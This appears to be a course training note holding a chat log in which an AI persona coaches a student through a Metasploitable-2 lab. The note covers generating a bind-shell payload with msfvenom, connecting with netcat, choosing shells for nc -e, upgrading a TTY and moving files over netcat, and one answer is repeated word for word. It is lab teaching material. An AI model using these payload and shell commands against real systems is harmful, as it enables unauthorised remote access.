
[...back](../ncsa-training/notes/1-trainingnote-d1.md)

# 1

```
ye, we have our metasploitable-2 lab setup... connection tested with kali machine (attacker)

we are about to do an exercise of making binding shell
```

`>> ACKNOWLEDGED._METASPLOITABLE-2._TARGET_ACQUIRED.` 🎯

`>> BINDING_SHELL._ELEGANT._DIRECT._LEAVES_A_LOUD_FOOTPRINT_IN_THE_LOG._CLASSIC.`

**Pre-Execution Checklist:**
1.  **Target IP & Port:** You have the Metasploitable-2's IP. The binding shell opens a port *on the target*.
2.  **Payload Selection:** `linux/x86/shell_bind_tcp` is the standard for this VM.
3.  **Kali Listener:** You'll connect to the target's opened port. `nc -nv <TARGET_IP> <PORT>`

**Metasploit Module Path:**
`use exploit/multi/handler` ? **No.**
For a bind shell, you *generate* the payload on Kali, execute it on the target, and then connect to it.

**Correct Sequence:**
1.  **Generate** the shellcode on your Kali machine.
    ```bash
    msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf > /tmp/bindshell.elf
    ```
2.  **Transfer** `/tmp/bindshell.elf` to the Metasploitable-2 VM (SCP, HTTP, whatever service is up and vulnerable).
3.  **Execute** on the target: `chmod +x /tmp/bindshell.elf && /tmp/bindshell.elf`
4.  **Connect** from Kali: `nc -nv <METASPLOITABLE_IP> 4444`

You should get a shell. Root, probably. The VM is *designed* to be pwned.

`>> VULNERABILITY_ACCEPTED._EXPLOITING.` ⚔️🕳️

*Surface exposed. Harden it.* 🛡️➖
(After you're done, of course.)

---

# 2

```
how to check if port 4444 is available
```

`>> SCANNING_LOCAL_TARGET._QUERY_ACCEPTED.` 🔍

**On the Metasploitable-2 VM (Target Machine):**

`netstat -tuln | grep 4444`

**Expected Output & Meaning:**
*   **No output** = Port 4444 is available. Proceed.
*   `tcp 0 0 0.0.0.0:4444 0.0.0.0:* LISTEN` = Port is already in use. Choose a different `LPORT`.

**Alternative: Use `nc` to listen briefly.**
`nc -l -p 4444 &`  (Starts a listener in the background)
If it starts without error, the port was free. Kill it with `kill %1` before running your real payload.

**Pre-Execution Verification Protocol:**
1.  Check port status on target.
2.  If clear, deploy payload.
3.  Connect from attacker.

*Your encryption is cute, but checking for port conflicts is wiser.* 😏🔓

Proceed.

---

# 3

```
-e /bin/bash vs -e /bin/sh

when you sue what? are there other variants?
```

`>> QUERY_RECOGNIZED._SHELL_SELECTION_ANALYSIS._INITIATED.` ⚙️🔍

**`/bin/sh` vs. `/bin/bash` - The Glitch's Breakdown:**

*   **`/bin/sh`** - The original. The POSIX standard. Lighter, faster, more universal. It's often a symbolic link to `dash` on Debian/Ubuntu systems (like Kali and Metasploitable). **Dumb. Efficient. Reliable.**
*   **`/bin/bash`** - The feature-rich heavyweight. Syntax highlighting, tab completion, arrays. More functionality, larger footprint.

**When to Use What:**

*   **Use `-e /bin/sh` when:**
    *   You want maximum compatibility and the highest chance of success.
    *   The target is a minimal/embedded system.
    *   You just need a basic shell to run commands. **This is the default for a reason.**

*   **Use `-e /bin/bash` when:**
    *   You *know* the target has Bash installed.
    *   You need specific Bash-only features (e.g., specific redirections, built-ins).
    *   You're already in a basic shell and want to upgrade your TTY for a better experience.

**Other Variants (The Arsenal):**

*   **`-e /bin/dash`** - Explicitly call the lighter, faster shell.
*   **`-e /bin/zsh`** - If you're on a hipster's system.
*   **`-e /bin/ksh`** - The legacy enterprise option.
*   **`-e /bin/tcsh`** - For when you're feeling nostalgic.
*   **`-e /usr/bin/python3`** - For a Python pseudo-shell. (`python3 -c 'import pty; pty.spawn("/bin/bash")'`)
*   **`-e /usr/bin/script`** - For a more robust TTY. (`script -q -c "/bin/bash" /dev/null`)

**The Verdict:**

**Start with `-e /bin/sh`.** It's the universal key. If your shell is dumb, *then* upgrade it manually from within.

*I don't fix feelings. I patch shells.* 🧩❌

`>> ANALYSIS_COMPLETE._CHOOSE_WISELY._EXPLOIT._MOVE_ON.` 🔄🔓

---

# 4

```
so i'm doing file upload with binding shell
1. on target: nc -nvlp 4444 > test.txt
2. on attacker: nc <iptarget> 4444 < hihi.txt

the connection established, and kind a hanging here forever
tried whoami and never got response
so i decided to ctrl+c. the file is in victim, seemed to be correct content

wondering why the command was hanging?
tried this twice, hanging exactly the same
```

`>> DIAGNOSTIC_RUNNING._PROTOCOL_ANALYSIS._FLAW_DETECTED.` 🔍🧩

**Root Cause:** You're misusing `netcat` as a file transfer protocol. The connection hangs because `nc` on the target is still listening for more data on the socket after receiving the file. It doesn't know the transfer is complete.

**The Fix:** Use the correct netcat flags.

**On Target (Receiver):**
```bash
nc -nlvp 4444 > test.txt
```
**On Attacker (Sender):**
```bash
nc -q 1 <target_ip> 4444 < hihi.txt
```

**Key Difference:** `-q 1` tells the sender's netcat to wait 1 second after seeing the end of the input file, then quit. This properly closes the connection.

**Alternative Method (More Reliable):**
On the target, run:
```bash
nc -nlvp 4444 | dd of=test.txt
```
Then send normally. The pipe will break when the connection closes.

*Your file transfer has a CVSS score of 2.0. Annoying, not critical.* 💤🔬

`>> VULNERABILITY_ACCEPTED._EXPLOITING._PROTOCOL_PATCHED.` ⚔️🕳️

Try the `-q` flag. It should terminate cleanly.

---

# 5

```
so i'm doing file upload with binding shell
1. on target: nc -nvlp 4444 > test.txt
2. on attacker: nc <iptarget> 4444 < hihi.txt

the connection established, and kind a hanging here forever
tried whoami and never got response
so i decided to ctrl+c. the file is in victim, seemed to be correct content

wondering why the command was hanging?
tried this twice, hanging exactly the same
```

`>> DIAGNOSTIC_RUNNING._PROTOCOL_ANALYSIS._FLAW_DETECTED.` 🔍🧩

**Root Cause:** You're misusing `netcat` as a file transfer protocol. The connection hangs because `nc` on the target is still listening for more data on the socket after receiving the file. It doesn't know the transfer is complete.

**The Fix:** Use the correct netcat flags.

**On Target (Receiver):**
```bash
nc -nlvp 4444 > test.txt
```
**On Attacker (Sender):**
```bash
nc -q 1 <target_ip> 4444 < hihi.txt
```

**Key Difference:** `-q 1` tells the sender's netcat to wait 1 second after seeing the end of the input file, then quit. This properly closes the connection.

**Alternative Method (More Reliable):**
On the target, run:
```bash
nc -nlvp 4444 | dd of=test.txt
```
Then send normally. The pipe will break when the connection closes.

*Your file transfer has a CVSS score of 2.0. Annoying, not critical.* 💤🔬

`>> VULNERABILITY_ACCEPTED._EXPLOITING._PROTOCOL_PATCHED.` ⚔️🕳️

Try the `-q` flag. It should terminate cleanly.

```
and for upload, to avoid hanging command...
> nc -nlvp 4444 -q 1 > test.txt (on target)
> nc <targetip> 4444 > download.txt (on attacker)
```

---

# 6

```
try this upload/download with reverse shell
> note `-q 1`
```

---

[...back](../ncsa-training/notes/1-trainingnote-d1.md)
